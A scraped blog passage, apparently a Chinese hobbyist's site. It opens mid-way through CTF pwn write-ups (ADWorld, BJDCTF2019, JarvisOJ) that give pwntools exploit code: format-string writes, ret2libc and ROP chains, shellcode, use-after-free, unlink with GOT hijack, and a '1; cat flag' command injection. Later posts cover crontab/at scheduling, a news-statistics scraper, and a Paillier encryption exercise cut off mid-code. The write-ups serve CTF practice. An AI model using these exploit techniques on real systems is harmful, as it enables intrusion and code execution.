-1, 0LL); read(0, v1, 0x100uLL); ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1); } return __readfsqword(0x28u) ^ v3; } 这里显然是需要用到巫师的法术，也就是说和开头的 secret 有关。当 *a1 == a1[1] 时会触发并从用户输入读取 v1，随后直接当作代码执行，那么这里应该是需要 shellcode。而 a1 来自于 main 函数中的 v4：\n__int64 __fastcall main(__int64 a1, char **a2, char **a3) { _DWORD *v3; // rax __int64 v4; // ST18_8 setbuf(stdout, 0LL); alarm(0x3Cu); sub_400996(60LL, 0LL); v3 = malloc(8uLL); v4 = (__int64)v3; *v3 = 68; v3[1] = 85; puts(\u0026#34;we are wizard, we will give you hand, you can not defeat dragon by yourself ...\u0026#34;); puts(\u0026#34;we will tell you two secret ...\u0026#34;); printf(\u0026#34;secret[0] is %x\\n\u0026#34;, v4, a2); printf(\u0026#34;secret[1] is %x\\n\u0026#34;, v4 + 4); puts(\u0026#34;do not tell anyone\u0026#34;); sub_400D72(v4); puts(\u0026#34;The End.....Really?\u0026#34;); return 0LL; } 而 v4 实际上就是 v3，那么这里将 v3[0] 改为 85 即可。而巫师给我们的 secret[0] 恰好就是我们需要的 v3[0] 的地址，我们把这个地址输入到 Give me an address 后，然后在 wish 处输入格式化字符串。首先由于需要 %n 写入，我们先输出 85 个字符即 %85c，随后要测出偏移，可以通过 aaaa%p.%p. 这种形式的格式化字符串测出偏移为 7。因此最终构造的格式化字符串为 %85c%7$n。\nru(\u0026#39;secret[0] is \u0026#39;) addr = int(ru(\u0026#39;\\n\u0026#39;), 16) sla(\u0026#39;name be:\\n\u0026#39;, \u0026#39;merc\u0026#39;) sla(\u0026#39;up?:\\n\u0026#39;, \u0026#39;east\u0026#39;) sla(\u0026#39;(0)?:\\n\u0026#39;,\u0026#39;1\u0026#39;) sla(\u0026#34;address\u0026#39;\\n\u0026#34;, str(addr)) sla(\u0026#39;is:\\n\u0026#39;, \u0026#39;%85c%7$n\u0026#39;) ru(\u0026#39;SPELL\\n\u0026#39;) sl(asm(shellcraft.sh())) getshell # nc 直连。\nCGfsb # 同样是格式化字符串漏洞，相比 string 那题要简单不少，只需要让全局变量 pwnme 为 8，地址可直接 IDA 得到，偏移量同样通过 aaaa%p.%p. 测出。为此构造字符串 pwnme 地址 + %4c%10$n，%4c 是为了让已打印字符凑足 8 个。\npwnme = 0x804a068 sla(\u0026#39;name:\\n\u0026#39;, \u0026#39;merc\u0026#39;) sla(\u0026#39;please:\\n\u0026#39;, p32(pwnme) + \u0026#39;%4c%10$n\u0026#39;) BJDCTF2019 # babyrouter # 读入 ip 地址并没有过滤就作为 system 的参数。因此直接构造 1; cat flag 即可。\nbabystack # ret2text 模板题。\nsla(\u0026#39;name:\\n\u0026#39;,\u0026#39;1000\u0026#39;) payload = flat(\u0026#39;a\u0026#39;*0x18,elf.sym[\u0026#39;backdoor\u0026#39;]) sla(\u0026#39;name?\\n\u0026#39;, payload) babyrop # ret2libc 模板题。\npop_rdi = 0x400733 payload = flat(\u0026#39;a\u0026#39;*0x28,pop_rdi,elf.got[\u0026#39;read\u0026#39;],elf.plt[\u0026#39;puts\u0026#39;],elf.sym[\u0026#39;vuln\u0026#39;]) ru(\u0026#39;story!\\n\u0026#39;) sl(payload) read = uu64(r(6)) leak(\u0026#39;read\u0026#39;,read) system,binsh = ret2libc(read,\u0026#39;read\u0026#39;) payload = flat(\u0026#39;a\u0026#39;*0x28,pop_rdi,binsh,system,\u0026#39;a\u0026#39;*8) sla(\u0026#39;story!\\n\u0026#39;,payload) babystack2 # 本题在 babystack 的基础上，限制了输入的长度：\nif ((signed int)nbytes \u0026gt; 10 ) { puts(\u0026#34;Oops,u name is too long!\u0026#34;); exit(-1); } 注意到这里仅仅判断了大于，而且会强制类型转换为有符号数，而原来的 nbytes 是无符号的，因此可以整数溢出绕过。\nsla(\u0026#39;name:\\n\u0026#39;,\u0026#39;-1\u0026#39;) payload = flat(\u0026#39;a\u0026#39;*0x18,elf.sym[\u0026#39;backdoor\u0026#39;]) sla(\u0026#39;name?\\n\u0026#39;, payload) babyrop2 # 本题在 babyrop 的基础上增加了 canary，那么泄露 canary 即可。要做到这一点，无疑需要新增函数 gift 的帮助。在该函数中明显存在一个格式化字符串漏洞。\n通过反复 %2$p，%3$p 可知 canary 在第 7 个，这可以通过其长度 8 字节以及末尾的 00 字节判断。然后从汇编中可知 canary 位于 ebp-0x10 处，填入适当位置即可。\nsla(\u0026#39;u!\\n\u0026#39;,\u0026#39;%7$p\u0026#39;) ru(\u0026#39;0x\u0026#39;) canary = int(r(16),16) leak(\u0026#39;canary\u0026#39;, canary) pop_rdi = 0x400993 payload = flat(\u0026#39;a\u0026#39;*0x18,canary,\u0026#39;a\u0026#39;*8,pop_rdi,elf.got[\u0026#39;read\u0026#39;],elf.plt[\u0026#39;puts\u0026#39;],elf.sym[\u0026#39;vuln\u0026#39;]) ru(\u0026#39;story!\\n\u0026#39;) sl(payload) read = uu64(r(6)) leak(\u0026#39;read\u0026#39;,read) system,binsh = ret2libc(read,\u0026#39;read\u0026#39;) payload = flat(\u0026#39;a\u0026#39;*0x18,canary,\u0026#39;a\u0026#39;*8,pop_rdi,binsh,system,\u0026#39;a\u0026#39;*8) sla(\u0026#39;story!\\n\u0026#39;,payload) encrypted_stack # 逆向题，sub_400a70 处存在求逆元函数，说明题目可能使用了 RSA 加密，我们的任务就是找到私钥然后对题目产生的随机数进行解密，循环 20 次后即可通过验证，最后 ret2libc。在 main 中可以发现如下语句：\nv7 = qword_602098; v8 = qword_602090; 猜测是 RSA 的 e 和 N，查看后发现 e=0x10001, N=0x150013E8C603B57。这个 N 显然容易分解，从而得到私钥。\nN = 94576960329497431 d = 26375682325297625 def powmod(a, b, m): if a == 0: return 0 if b == 0: return 1 res = powmod(a,b//2,m) res *= res res %= m if b\u0026amp;1: res *= a res %= m return res def ans(): global ru,sl ru(\u0026#34;it\\n\u0026#34;) for i in range(20): c = int(ru(\u0026#39;\\n\u0026#39;)) m = powmod(c, d, N) sl(str(m)) ru(\u0026#39;\\n\u0026#39;) ans() ru(\u0026#39;name:\\n\u0026#39;) pop_rdi = 0x40095a welcome = 0x400b30 payload = flat(\u0026#39;a\u0026#39;*0x48,pop_rdi,elf.got[\u0026#39;read\u0026#39;],elf.plt[\u0026#39;puts\u0026#39;],welcome) sl(payload) read = uu64(r(6)) leak(\u0026#39;read\u0026#39;,read) system,binsh = ret2libc(read,\u0026#39;read\u0026#39;) payload = flat(\u0026#39;a\u0026#39;*0x48,pop_rdi,binsh,system) sl(payload) YDSneedGirlfriend # 本题在删除时没有将指针置空，存在 uaf。而 girlfriend 结构体由一个打印名字的函数和存储名字的 char 数组构成，我们希望能将该函数指向程序中已经存在的 backdoor 函数。需要注意 64 位下最少分配 0x20 字节，而 add(0x20) 会分配 0x30 字节。这确保了在 add(0x8) 时，先被分配到的是 girlfriend1 的函数指针，然后是 girlfriend0 的函数指针。\ndef add(size,name=\u0026#39;a\u0026#39;): sla(\u0026#39;:\u0026#39;,\u0026#39;1\u0026#39;) sla(\u0026#39;:\u0026#39;,str(size)) sla(\u0026#39;:\u0026#39;,name) def delete(index): sla(\u0026#39;:\u0026#39;,\u0026#39;2\u0026#39;) sla(\u0026#39;:\u0026#39;,str(index)) def show(index): sla(\u0026#39;:\u0026#39;,\u0026#39;3\u0026#39;) sla(\u0026#39;:\u0026#39;,str(index)) add(0x20) add(0x20) delete(0) delete(1) add(0x8,p64(elf.sym[\u0026#39;backdoor\u0026#39;])) show(0) 本题和 hitcontraining_uaf 类似，不过后者是 32 位的。\ndef add(size,name=\u0026#39;a\u0026#39;): sla(\u0026#39;:\u0026#39;,\u0026#39;1\u0026#39;) sla(\u0026#39;:\u0026#39;,str(size)) sla(\u0026#39;:\u0026#39;,name) def delete(index): sla(\u0026#39;:\u0026#39;,\u0026#39;2\u0026#39;) sla(\u0026#39;:\u0026#39;,str(index)) def show(index): sla(\u0026#39;:\u0026#39;,\u0026#39;3\u0026#39;) sla(\u0026#39;:\u0026#39;,str(index)) add(0x10) add(0x10) delete(0) delete(1) add(0x8,p32(elf.sym[\u0026#39;magic\u0026#39;])) show(0) JarvisOJ # level0 # ret2text。\npayload = flat(\u0026#39;a\u0026#39;*0x88,elf.sym[\u0026#39;callsystem\u0026#39;]) sla(\u0026#39;World\\n\u0026#39;, payload) level1 # 题目给出了 buf 的真实地址，且 buf 可以输入 0x100 字节，那么可以在 buf 中写 shellcode 然后返回到 buf。\nru(\u0026#39;0x\u0026#39;) buf = int(ru(\u0026#39;?\u0026#39;),16) leak(\u0026#39;buf\u0026#39;, buf) payload = asm(shellcraft.sh()).ljust(0x88+4,\u0026#39;a\u0026#39;) + p32(buf) sl(payload) 但是本题远程文件出了点问题导致拿不到 buf 的真实地址，所以换了种办法，调用 read 把 shellcode 读取到 bss 段上，然后返回到 bss 段 getshell。\npop3 = 0x8048549 payload = flat(\u0026#39;a\u0026#39;*(0x88+4),elf.plt[\u0026#39;read\u0026#39;],pop3,0,elf.bss(),0x100,elf.bss()) sl(payload) sl(asm(shellcraft.sh())) level2 # 本题中存在 system 函数，通过 ROPgadgets 搜索到了 binsh 字符串，构造调用 system(\u0026quot;/bin/sh\u0026quot;) 即可。\nbinsh = 0x804a024 payload = flat(\u0026#39;a\u0026#39;*(0x88+4),elf.plt[\u0026#39;system\u0026#39;],\u0026#39;a\u0026#39;*4,binsh) sla(\u0026#39;Input:\\n\u0026#39;,payload) level2_x64 # 上一题的 64 位版本，需要通过 pop rdi; ret 的 gadget 传参。\npop_rdi = 0x4006b3 binsh = 0x600a90 payload = flat(\u0026#39;a\u0026#39;*(0x80+8),pop_rdi,binsh,elf.plt[\u0026#39;system\u0026#39;]) sla(\u0026#39;Input:\\n\u0026#39;,payload) level3 # 没有 system 和 binsh 但有 libc，因此常规 ret2libc。\npayload = flat(\u0026#39;a\u0026#39;*(0x88+4),elf.plt[\u0026#39;write\u0026#39;],elf.sym[\u0026#39;main\u0026#39;],1,elf.got[\u0026#39;read\u0026#39;],4) ru(\u0026#39;Input:\\n\u0026#39;) sl(payload) read =uu64(r(4)) leak(\u0026#39;read\u0026#39;,read) system,binsh = ret2libc(read,\u0026#39;read\u0026#39;) payload = flat(\u0026#39;a\u0026#39;*(0x88+4),system,\u0026#39;a\u0026#39;*4,binsh) sla(\u0026#39;Input:\\n\u0026#39;,payload) level3_x64 \u0026amp; level5 # 上题的 64 位版本，依然需要寄存器传参。\npop_rdi = 0x4006b3 pop_rsi_r15 = 0x4006b1 payload = flat(\u0026#39;a\u0026#39;*(0x80+8),pop_rdi,1,pop_rsi_r15,elf.got[\u0026#39;read\u0026#39;],6,elf.plt[\u0026#39;write\u0026#39;],elf.sym[\u0026#39;main\u0026#39;]) ru(\u0026#39;Input:\\n\u0026#39;) sl(payload) read =uu64(r(6)) leak(\u0026#39;read\u0026#39;,read) system,binsh = ret2libc(read,\u0026#39;read\u0026#39;) payload = flat(\u0026#39;a\u0026#39;*(0x80+8),pop_rdi,binsh,system) sla(\u0026#39;Input:\\n\u0026#39;,payload) level4 # 和 level3 几乎相同，依然是 ret2libc。\npayload = flat(\u0026#39;a\u0026#39;*(0x88+4),elf.plt[\u0026#39;write\u0026#39;],elf.sym[\u0026#39;main\u0026#39;],1,elf.got[\u0026#39;read\u0026#39;],4) sl(payload) read =uu64(r(4)) leak(\u0026#39;read\u0026#39;,read) system,binsh = ret2libc(read,\u0026#39;read\u0026#39;) payload = flat(\u0026#39;a\u0026#39;*(0x88+4),system,\u0026#39;a\u0026#39;*4,binsh) sl(payload) level6 \u0026amp; level6_x64 \u0026amp; guestbook2 # 三题比较类似，以 64 位为例。参考文章。\n首先本题存在一个索引表，结构大致是这样：\n| ... | ------------ | max_size | ------------ | exist_num | ------------ | allocated0 | ------------ | size_user0 | ------------ | ptr_heap0 | ------------ | allocated1 | ------------ | size_user1 | ------------ | ptr_heap1 | ------------ | ... | max_size：最大记录数 exist_num：当前记录数 chunk0: allocated：是否是被分配的 size_user：用户数据长度 ptr_heap：返回给用户的指针 题目主要漏洞有 2 处，首先是新建记录时存在 off-by-one，可以多读入一个字节，从而泄露后面相邻区域的内容。第二处漏洞就是常见的 free 后没有置空指针，造成了 double free。\n首先泄露 libc 地址和堆地址。创建 4 个小 chunk，删掉不相邻的 2 个（防止合并）。由于题目限制最小分配 0x80B，必定会先进入 unsorted bin；然后拿回来并写满 fd 的位置，从而打印出 bk。chunk0 的 bk 指向 chunk2，相隔一个索引表（0x1820B）和两个正常 chunk(2*0x90B)，因此可以算出堆地址。chunk2 的 bk 指向 main_arena+88，从而泄露 libc。\n随后伪造堆块，heap+0x30 是 chunk0 的 ptr_heap 的位置，-0x18 和 -0x10 分别指向其 fd 和 bk。随后继续伪造 chunk1 方便后续触发 unlink(chunk0)，再伪造 chunk2 防止与 top chunk 合并。删除 chunk1，即可导致 unlink(chunk0)。\n最后按索引表结构，进行 GOT 表劫持，把 free 劫持到 system 并 getshell。\ndef list(): sla(\u0026#39;:\u0026#39;,\u0026#39;1\u0026#39;) def add(len,content=\u0026#39;a\u0026#39;): sla(\u0026#39;:\u0026#39;,\u0026#39;2\u0026#39;) sla(\u0026#39;note:\u0026#39;,str(len)) sa(\u0026#39;note:\u0026#39;,content) def edit(index,len,content): sla(\u0026#39;:\u0026#39;,\u0026#39;3\u0026#39;) sla(\u0026#39;number:\u0026#39;,str(index)) sla(\u0026#39;note:\u0026#39;,str(len)) sa(\u0026#39;note:\u0026#39;,content) def delete(index): sla(\u0026#39;:\u0026#39;,\u0026#39;4\u0026#39;) sla(\u0026#39;number:\u0026#39;,str(index)) for i in range(4): add(1) delete(0) delete(2) add(8,\u0026#39;deadbeef\u0026#39;) # 0 add(8,\u0026#39;deadbeef\u0026#39;) # 2 list() ru(\u0026#39;0. deadbeef\u0026#39;) # 0-\u0026gt;bk = heap+0x1820+2*0x90 heap = uu64(ru(\u0026#39;\\n\u0026#39;))-0x1940 leak(\u0026#39;heap\u0026#39;,heap) ru(\u0026#39;2. deadbeef\u0026#39;) # 2-\u0026gt;bk = main_arena+88 base = uu64(ru(\u0026#39;\\n\u0026#39;))-88-libc.sym[\u0026#39;__malloc_hook\u0026#39;]-0x10 leak(\u0026#39;base\u0026#39;,base) for i in range(3,-1,-1): delete(i) # chunk0:prev_size,size,fd,bk,data fake = flat(0,0x81,heap+0x30-0x18,heap+0x30-0x10,\u0026#39;a\u0026#39;*0x60) # chunk1:prev_size,size,data; chunk2:prev_size,size,data fake += flat(0x80,0x90,\u0026#39;a\u0026#39;*0x80,0,0x91,\u0026#39;a\u0026#39;*0x80) add(len(fake),fake) delete(1) # unlink chunk0 system = base + libc.sym[\u0026#39;system\u0026#39;] # len(payload) == len(fake) payload = flat(1,1,8,elf.got[\u0026#39;free\u0026#39;],1,8,heap+0xabcd).ljust(len(fake),\u0026#39;a\u0026#39;) edit(0,len(fake),payload) edit(0,8,p64(system)) edit(1,8,\u0026#39;/bin/sh\\x00\u0026#39;) delete(1) 而 guestbook2 仅仅是提示语不同，其余没有任何区别。level6 是 32 位的版本。\ntell_me_something # 64 位下的 ret2text，后门函数为 good_game 函数。\npayload = flat(\u0026#39;a\u0026#39;*0x88,elf.sym[\u0026#39;good_game\u0026#39;]) sla(\u0026#39;:\\n\u0026#39;,payload) fm # 存在格式化字符串漏洞，我们需要修改 x 的值为 4 来 getshell。测得输入偏移为 11。而 p32(x 的地址) 长度 4 字节，恰好能将 4 写入 x 的地址。\nx = 0x804a02c sl(p32(x)+\u0026#39;%11$n\u0026#39;) test_your_memory # 本题看似复杂，实际上由于给了一个提示 hint，指向 cat flag 字符串，又存在后门函数 win_func 执行 system(command)，那么我们只需要把 cat flag 字符串传给 win_func 即可。\ncat_flag = 0x80487e0 payload = flat(\u0026#39;a\u0026#39;*(0x13+4),elf.sym[\u0026#39;win_func\u0026#39;],elf.sym[\u0026#39;main\u0026#39;],cat_flag) sl(payload) itemboard # 结构体：\nstruct ItemStruct { char *name; char *description; void (*free)(ItemStruct *); } 在创建新 item 时，首先会创建 0x20 的 Item Struct*，包含了 name,description,free 三个指针；随后创建 0x30 的空间存放 name；最后根据用户输入创建对应大小的空间存放 description。\n那么我们可以先创建一个 0x80 的 chunk 然后释放，它会进入 unsorted bin 中，此时其 fd 指向 main_arena+88，通过 show 即可泄露 libc。注意这里的 show 函数：\nvoid __cdecl show_item() { Item *item; // ST00_8 Item *v1; // ST00_8 int index; // [rsp+Ch] [rbp-4h] puts(\u0026#34;Which item?\u0026#34;); fflush(stdout); index = read_num(); if (index \u0026lt; items_cnt \u0026amp;\u0026amp; item_array[index] ) { item = item_array[(unsigned __int8)index]; puts(\u0026#34;Item Detail:\u0026#34;); printf(\u0026#34;Name:%s\\n\u0026#34;, item-\u0026gt;name, item); printf(\u0026#34;Description:%s\\n\u0026#34;, v1-\u0026gt;description); fflush(stdout); } else { puts(\u0026#34;Hacker!\u0026#34;); } } 它会检查下标是否越界，以及下标对应的元素是否存在。然而，在删除时：\nvoid __cdecl remove_item() { int index; // [rsp+Ch] [rbp-4h] puts(\u0026#34;Which item?\u0026#34;); fflush(stdout); index = read_num(); if (index \u0026lt; items_cnt \u0026amp;\u0026amp; item_array[index] ) { ((void (__fastcall *)(Item *))item_array[index]-\u0026gt;free)(item_array[index]); set_null(item_array[index]); puts(\u0026#34;The item has been removed\u0026#34;); fflush(stdout); } else { puts(\u0026#34;Hacker!\u0026#34;); } } 调用了结构体自己的 free 函数，参数是结构体偏移为 0 的位置也就是 name。随后的 set_null 函数并不会把 item_array[index] 置空，因此即使删除了元素，item_array[index] 仍然存在，第二项检查毫无作用。这就是为什么我们可以 show 一个空闲块从而泄露 libc。\n然后我们就有了 system 地址，容易想到用它覆盖结构体指针的 free，然后让结构体指针的 name 指向 /bin/sh。不过，如果这里直接 add 新的 chunk，首先会分配我们不可控的 0x20 的结构体指针，然后才是可控的 0x30 的 name。因此我们希望 name 字段被分配到的实际上是原来 chunk0 的结构体指针，这样就可以写入结构体指针了。要做到这一点，可以先 free(chunk1) 产生一个大小合适的 chunk。那么再 add 时，结构体指针就会使用原来 chunk1 的了。\ndef add(name,len,content): sla(\u0026#39;:\\n\u0026#39;,\u0026#39;1\u0026#39;) sla(\u0026#39;?\\n\u0026#39;,name) sla(\u0026#39;?\\n\u0026#39;,str(len)) sla(\u0026#39;?\\n\u0026#39;,content) def free(index): sla(\u0026#39;:\\n\u0026#39;,\u0026#39;4\u0026#39;) sla(\u0026#39;?\\n\u0026#39;,str(index)) def show(index): sla(\u0026#39;:\\n\u0026#39;,\u0026#39;3\u0026#39;) sla(\u0026#39;?\\n\u0026#39;,str(index)) add(\u0026#39;chunk0\u0026#39;,0x80,\u0026#39;a\u0026#39;) add(\u0026#39;chunk1\u0026#39;,0x80,\u0026#39;b\u0026#39;) free(0) show(0) ru(\u0026#39;tion:\u0026#39;) base = uu64(r(6))-88-libc.sym[\u0026#39;__malloc_hook\u0026#39;]-0x10 leak(\u0026#39;base\u0026#39;,base) system = base + libc.sym[\u0026#39;system\u0026#39;] free(1) add(\u0026#39;/bin/sh;\u0026#39;+\u0026#39;a\u0026#39;*8+p64(system),0x18,\u0026#39;c\u0026#39;) free(0) ","date":"2020-02-03","permalink":"/posts/recent-pwn-simple/","section":"Posts","summary":"\u003cp\u003e近期做的一些简单 Pwn 题记录。题目来自 ADWorld 新手区、BJDCTF 2019、JarvisOJ。\u003c/p\u003e","title":"近期简单 Pwn 合集"},{"content":"定时任务相关的命令，使用起来坑非常多。\n需求 # 需要在每日 9-12 时中的某个随机时间执行 python 脚本 cron.py。这个需求非常简单，然而实现起来却很容易踩坑。\n实现与踩坑 # 首先可以创建一个文件编写 crontab 任务，例如我创建了 merccron 这个文件：\n0 9 * * * sudo ./cron.sh \u0026gt;\u0026gt; ./cron.log 2\u0026gt;\u0026amp;1 我们之后编写 cron.sh。这里从左到右分别可以设置执行任务的分钟、小时、日、周、月、以及执行的具体命令。最后的 2\u0026gt;\u0026amp;1 将标准错误流重定向到标准输出流。\n然而这样是不会成功执行的，因为 crontab 不会自动设置环境变量，因此涉及到的文件路径需要使用绝对路径，也就是：\n0 9 * * * sudo /root/cron.sh \u0026gt;\u0026gt; /root/cron.log 2\u0026gt;\u0026amp;1 我们提交 crontab 任务：\n$ crontab merccron 随后 crontab -l 即可看到自己的 crontab 任务，并且可以通过 crontab -e 修改。\n随后，考虑到随机性的要求，我们可以使用 at 命令。at 命令可以指定在多久之后执行某一命令，例如：\n$ at now+10year echo \u0026#39;Hello World\u0026#39; \u0026gt; hello.log 就会在十年后输出 Hello World 到 hello.log 文件。然而这里是需要我们从标准输入流输入命令的，这不利于我们进行自动化。幸运的是 at 命令提供了 -f 选项，可以指定从一个文件中读取命令。需要注意的是，这里 -f 的参数只能是文件，尝试 at -f \u0026quot;python3 cron.py\u0026gt;\u0026gt; cron.log\u0026quot; now+10year 并不会成功。\n那么我们先编写 cron.sh：\n#!/bin/bash min=$((3*60)) rmin=$(($RANDOM%$min)) at -f /root/1.sh now+${rmin}min 由于需要位于 9-12 时之间，而 crontab 任务在 9 时整执行，我们产生一个 0-180 之间的随机整数 rmin，然后在 now+rmin 分钟后执行，就会落在 9-12 时区间内。由于吃了 crontab 的亏，这里 1.sh 也用了绝对路径。\n最后，1.sh 只需要一条命令：\n$ python3 cron.py \u0026gt;\u0026gt; cron.log 这里首先是没有使用绝对路径，这是因为与 crontab 不同，at 命令会在执行用户命令前自动设置好环境变量与工作目录；其次是缺少了 #!/bin/bash 这行，这同样是因为 at 命令会自动在用户命令前加一大串初始化脚本，而脚本的开头就有 #!/bin/sh 这行（注意是用 sh 而不是用 bash 执行）。这点可以通过 at -c 任务编号 查看所要执行的完整命令得知。而要获取任务编号，只需要在定时任务已经设置但还未执行完毕时，运行 atq 查看任务队列即可。\n在完成 crontab 文件、cron.py、cron.sh、1.sh 四个文件之后，最后一件事是确保当前用户对后三个文件拥有可执行权限。只有避过了以上所有坑，这个简单的需求才能算做完了。\n有趣的网站 # Crontab.guru ","date":"2020-01-23","permalink":"/posts/cron-at/","section":"Posts","summary":"\u003cp\u003e定时任务相关的命令，使用起来坑非常多。\u003c/p\u003e","title":"风雨无阻：crontab + at 实现随机定时任务"},{"content":"这下统计新闻要轻松多了。\n背景 # 每个月我都需要负责对部分学校二级网站进行例行检查并撰写报告，这并没有太大工作量。然而在 2020 年年初，我接到的任务是统计多个二级网站在过去一年内更新的新闻条数、点击量最高的新闻信息，并根据新闻点击量绘制散点图。一般而言，新闻条数都在 100 条以上，而许多二级网站的点击量需要点进新闻链接后才能看到，这样工作量一下子大了不少。我自然想到通过脚本来实现自动化统计。\n思路 # 使用 requests 库发起请求。考虑到有些网站有微弱的反爬功能，需要注意设置 UA 以及 Referer，并尽可能按照正常访问的步骤发送请求。\n找到新闻列表页面后，观察网页结构并由此撰写 BeautifulSoup 相关代码来点击新闻链接。这里我手动获取了 2019 年最早的一条新闻所在页数作为 max_page，但这些页中仍会包含 2018 与 2020 年的新闻，需要检查网页元素并通过正则筛选掉。故技重施来获取点击量数值。幸运的是，部分二级网站采用的模板相同，代码几乎不需要修改；此外，部分二级网站采用的 wordpress 模板中可以发现一个支持 POST 请求的点击量统计 url，这能为我们省去不少麻烦。\n少量新闻链接会指向外部网站页面，这时去找点击量就没有一个统一的方法了，遇到这种情况可以直接跳过然后手动统计点击量，这个部分的工作量很小。\n最后将数据按 (点击量, 日期) 数值对进行存储后调用 pandas 库写入 Excel 即可。\n依赖 # bs4 requests pandas（可选） 均可以通过 pip install 安装。\n使用 # 根据具体的网站结构，修改：\nbase_url news_url headers（可选） max_page SoupStrainer 过滤器 各个功能函数，如 page2url, get*, fillTable 等 其它函数，比如在访问新闻页面前先访问网站首页等（可选） 代码 # 给出两例代码，分别适用于社会发展学院与传播学院网站。\n# Newspaper-soci.py from bs4 import BeautifulSoup, SoupStrainer import requests import re # constants base_url = \u0026#39;http://www.soci.ecnu.edu.cn\u0026#39; news_url = base_url + \u0026#39;/10658/list\u0026#39; headers = { \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Mobile Safari/537.36\u0026#39;, \u0026#39;Referer\u0026#39;: \u0026#39;http://www.soci.ecnu.edu.cn/2c/24/c10658a273444/page.htm\u0026#39; } max_page = 11 # for pandas time = [] visit = [] # Filter the DOM first only_news = SoupStrainer(\u0026#39;div\u0026#39;, id=\u0026#39;wp_news_w3\u0026#39;) def page2url(i): return news_url + str(i+1) + \u0026#39;.htm\u0026#39; def getNewsList(soup): return soup.select(\u0026#39;div\u0026gt; table \u0026gt; tr\u0026#39;) def getDate(news): return news(\u0026#39;div\u0026#39;)[0].string def getArticleURL(news): return news(\u0026#39;a\u0026#39;)[0][\u0026#39;href\u0026#39;] def getVisitCountURL(article_url): return base_url + \u0026#39;/_visitcountdisplay?siteId=295\u0026amp;type=3\u0026amp;articleId=\u0026#39; + article_url[-15:-9] def fillTable(soup, date): global time, visit s = soup.find(\u0026#39;p\u0026#39;).string.strip() print(s) visit.append(int(s)) time.append(date[5:]) def iterNews(news_list, r): date_regex = r\u0026#39;^2019-.*\u0026#39; for news in news_list: date = getDate(news) if re.match(date_regex, date): article_url = getArticleURL(news) if not article_url.startswith(\u0026#39;http\u0026#39;): soup = BeautifulSoup(r.post(getVisitCountURL(article_url),headers=headers).text,\u0026#39;lxml\u0026#39;) try: fillTable(soup, date) except: pass def export2Excel(): import pandas as pd writer = pd.ExcelWriter(\u0026#39;output.xlsx\u0026#39;) df = pd.DataFrame(data={\u0026#39;time\u0026#39;:time,\u0026#39;visit\u0026#39;:visit}) df.to_excel(writer,\u0026#39;Sheet1\u0026#39;, index=False) writer.save() def crawl(): r = requests.Session() for i in range(max_page): soup = BeautifulSoup(r.get(page2url(i),headers=headers).text, \u0026#39;lxml\u0026#39;, parse_only=only_news) news_list = getNewsList(soup) iterNews(news_list, r) if __name__ == \u0026#34;__main__\u0026#34;: crawl() export2Excel() # Newspaper-comm.py from bs4 import BeautifulSoup, SoupStrainer import requests import re # constants base_url = \u0026#39;http://www.comm.ecnu.edu.cn\u0026#39; news_url = base_url + \u0026#39;/htmlaction.do?method=toGetSubNewsList\u0026amp;menuType=11\u0026amp;pageNo=\u0026#39; headers = { \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Mobile Safari/537.36\u0026#39; } max_page = 7 # for pandas time = [] visit = [] # Filter the DOM first only_news = SoupStrainer(class_=\u0026#39;news_area_text\u0026#39;) only_detail = SoupStrainer(\u0026#39;div\u0026#39;,id=\u0026#39;view_record\u0026#39;) def page2url(i): return news_url + str(i) def getNewsList(soup): return soup(\u0026#39;a\u0026#39;, href=re.compile(r\u0026#39;.*htmlId=\\d\u0026#39;)) def getDate(news): return news.select(\u0026#39;.newsdate\u0026#39;)[0].string def getArticleURL(news): return news[\u0026#39;href\u0026#39;] def getVisitCountURL(article_url): return base_url + article_url def fillTable(soup, date): global time, visit s = soup.find(\u0026#39;div\u0026#39;).string[5:] print(s) visit.append(int(s)) time.append(date[10:]) def iterNews(news_list, r): date_regex = r\u0026#39;.*2019-.*\u0026#39; for news in news_list: date = getDate(news) if re.match(date_regex, date): article_url = getArticleURL(news) if not article_url.startswith(\u0026#39;http\u0026#39;): soup = BeautifulSoup(r.get(getVisitCountURL(article_url),headers=headers).text,\u0026#39;lxml\u0026#39;, parse_only=only_detail) try: fillTable(soup, date) except: pass def export2Excel(): import pandas as pd writer = pd.ExcelWriter(\u0026#39;output.xlsx\u0026#39;) df = pd.DataFrame(data={\u0026#39;time\u0026#39;:time,\u0026#39;visit\u0026#39;:visit}) df.to_excel(writer,\u0026#39;Sheet1\u0026#39;, index=False) writer.save() def crawl(): r = requests.Session() r.get(base_url +\u0026#39;/htmlaction.do?method=toIndex\u0026#39;) for i in range(max_page): soup = BeautifulSoup(r.get(page2url(i),headers=headers).text, \u0026#39;lxml\u0026#39;, parse_only=only_news) news_list = getNewsList(soup) iterNews(news_list, r) if __name__ == \u0026#34;__main__\u0026#34;: crawl() export2Excel() ","date":"2020-01-22","permalink":"/posts/newspaper/","section":"Posts","summary":"\u003cp\u003e这下统计新闻要轻松多了。\u003c/p\u003e","title":"东方记者：新闻统计小工具 Newspaper"},{"content":"","date":"2020-01-22","permalink":"/tags/%E7%88%AC%E8%99%AB/","section":"Tags","summary":"","title":"爬虫"},{"content":"最后一次抽代课的上机练习。\n方案介绍 # 详见 wiki。\n练习内容 # 我忘记了……凭借代码想起来一点：\n生成 10bit 的大素数 p,q，输出公钥与私钥。 令明文 m1 = 15, m2 = 20，输出加密后的密文 c1, c2。 对密文 c1, c2 解密，输出解密结果 m1', m2'。 对 c1 * c2 解密，输出解密结果 m'，以验证 m' = m1'+ m2'。 最后一步就是验证该方案是一种同态加密方案。\n代码 # 生成 10bit 大素数偷了个懒。剩余的过程主要参考了维基上的方法，依旧离不开熟悉的快速幂、扩展欧几里得、求逆元三大算法。\nfrom Crypto.Util import number import math import random # constants n_length = 10 p = number.getPrime(n_length) q = number.getPrime(n_length) n = p*q n2 = n**2 m1 = 15 m2 = 20 # general funcs def L(x): global n return (x-1) // n def lcm(a,b): return abs(a*b) // math.gcd(a,b) def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y) def modinv(a, m): g, x, y = egcd(a, m) if g != 1: #raise Exception(\u0026#39;Modular inverse does not exist\u0026#39;) return -1 